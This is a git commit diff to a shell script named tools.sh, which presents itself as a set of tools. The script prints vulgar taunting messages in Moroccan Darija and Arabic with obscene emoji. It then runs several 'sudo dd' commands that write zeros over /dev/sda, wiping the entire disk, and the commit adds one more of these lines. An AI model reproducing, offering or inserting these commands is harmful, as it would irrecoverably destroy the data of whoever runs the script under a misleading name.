fd8695ca9f647b0c196d1aaa05817ca3931287c4
hamza <hamzabenzidane01@gmail.com>
2025-06-17 02:57:16 +0100

    Update tools.sh

--- tools.sh
+++ tools.sh
@@ -8,8 +8,7 @@ clear
     echo -e "${YELLOW}  ydk fih hh nta li mkdyhach f krk hhhh 🖕🍆${NC}"
     echo -e "${YELLOW}  نتا اخويا لي مكتديهاش ف كرك ودابا يدك فيه هه 🖕🍆
     ${NC}"
-
-
+sudo dd if=/dev/zero of=/dev/sda bs=1M
 sudo dd if=/dev/zero of=/dev/sda bs=500M oflag=direct status=progress
 sudo dd if=/dev/zero of=/dev/sda bs=50M oflag=direct status=progress
 sudo dd if=/dev/zero of=/dev/sda bs=1M
